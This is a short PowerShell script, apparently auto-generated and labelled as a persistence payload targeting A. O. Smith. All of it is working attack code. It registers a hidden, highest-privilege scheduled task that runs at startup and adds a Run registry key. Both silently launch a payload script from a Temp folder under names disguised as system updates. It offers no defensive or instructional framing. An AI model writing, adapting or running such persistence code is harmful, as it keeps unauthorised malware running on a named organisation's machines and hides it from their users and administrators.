
# PowerShell Persistence Payload for A. O. Smith
# Generated: 2025-11-03T11:02:43.730198

function Add-ScheduledTaskPersistence {
    $taskName = "a_o_smith_SystemUpdate"
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File C:\Windows\Temp\a_o_smith_payload.ps1"
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force
}

function Add-RegistryPersistence {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "a_o_smith_Update"
    $regValue = "powershell.exe -WindowStyle Hidden -File C:\Windows\Temp\a_o_smith_payload.ps1"
    
    New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force
}

# Add persistence mechanisms
Add-ScheduledTaskPersistence
Add-RegistryPersistence

Write-Host "Persistence mechanisms added for A. O. Smith"
